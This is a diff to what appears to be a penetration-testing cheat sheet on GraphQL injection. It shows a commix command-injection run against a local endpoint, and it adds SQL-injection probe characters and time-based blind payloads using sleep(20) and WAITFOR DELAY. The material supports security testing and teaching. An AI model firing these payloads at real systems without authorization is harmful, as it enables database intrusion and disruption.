@@ -188,3 +188,14 @@ commix --url="http://127.0.0.1:5013/graphql"
 --data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg
 
 https://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/
+
+
+Single quote: ( ' )
+Double quote: ( " )
+Space followed by random character: (  test)
+After sending each of those, if an SQL error message is returned, then you, sir, have (probably) stumbled on an endpoint vulnerable to SQL injection.
+
+
+,(select * from (select(sleep(20)))a)
+%2c(select%20*%20from%20(select(sleep(20)))a)
+';WAITFOR DELAY '0:0:20'--
